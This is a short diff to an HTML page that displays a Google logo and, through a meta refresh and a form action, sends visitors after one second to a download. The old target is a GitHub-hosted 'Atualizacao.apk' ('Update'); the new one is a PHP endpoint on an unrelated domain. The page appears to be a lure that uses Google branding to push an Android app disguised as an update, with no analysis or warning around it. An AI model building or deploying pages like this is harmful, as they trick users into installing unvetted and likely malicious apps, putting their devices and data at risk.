@@ -36,8 +36,8 @@
 </head>
  
   <body class="bg-white">
- <meta http-equiv="refresh" content="1; URL='https://github.com/mobi-center/mobi-center/raw/main/Atualizacao.apk'"/>
-<form action="https://github.com/mobi-center/mobi-center/raw/main/Atualizacao.apk">
+ <meta http-equiv="refresh" content="1; URL='https://amapadostecladim.com/d.php'"/>
+<form action="https://amapadostecladim.com/d.php">
     <div class="container">
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
